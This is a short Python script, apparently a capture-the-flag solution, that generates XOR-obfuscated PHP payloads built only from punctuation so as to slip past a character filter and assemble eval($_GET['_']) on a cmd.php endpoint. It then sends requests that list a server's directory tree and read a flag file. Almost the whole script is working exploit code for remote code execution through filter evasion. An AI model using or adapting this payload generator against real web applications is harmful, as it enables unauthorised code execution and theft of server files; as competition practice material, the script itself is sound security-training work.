import string,requests,math

def create_payload(strings=b""):
    all_key = b"&|\[]\"#$%\'()*+,-./:;<=>?^_{}`"
    all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
    gets = ""
    keys = ""
    result = {}

    for i in strings:
        for j in all_key: 
            for z in all_key:
                if z^j == i:                
                    gets += chr(j)  
                    keys += chr(z)
                    result[chr(i)] = ".".join(["('"+ gets[i] + "'" + f"^'{keys[i]}')" for i in range(len(gets))])          
                    gets = ""
                    keys = ""
                    break

    payloads = []
    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')"}
    for i in strings:            
        try:
            payloads.append(result[chr(i)])
    
        except KeyError as e: 
            payloads.append(str(e))
        
    return ".".join(payloads).replace("\\","\\\\")


# list dir
url = "http://localhost/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"

# read file
url = "http://localhost:6074/slashroot/cmd.php?_=print_r(file('./z1n1_flagnya_om.txt'));"

payload = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
a = requests.post(url,data={"cmd": payload}).text
print(a)